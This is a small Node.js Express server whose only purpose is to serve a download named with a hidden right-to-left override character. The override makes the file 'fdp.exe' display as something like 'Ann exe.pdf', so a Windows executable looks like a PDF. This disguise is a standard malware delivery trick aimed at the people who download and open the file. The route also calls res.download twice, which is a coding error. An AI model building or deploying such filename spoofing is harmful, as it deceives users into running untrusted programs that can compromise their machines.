const express = require("express");
const path = require("path");
const cors = require("cors");
require("dotenv").config();
const app = express();
app.use(cors()); // Allow frontend requests

// Serve the file for download
const RLO = "\u202e";
const NBSP = "\u202f"; // This is the narrow no-break space
const filename = "Ann" + NBSP + RLO + "fdp.exe";

app.get("/download", (req, res) => {
  const filePath = path.join(__dirname, "files", filename); // Change to your file
  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
  res.download(filePath);

  res.download(filePath, filename); // Triggers file download
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
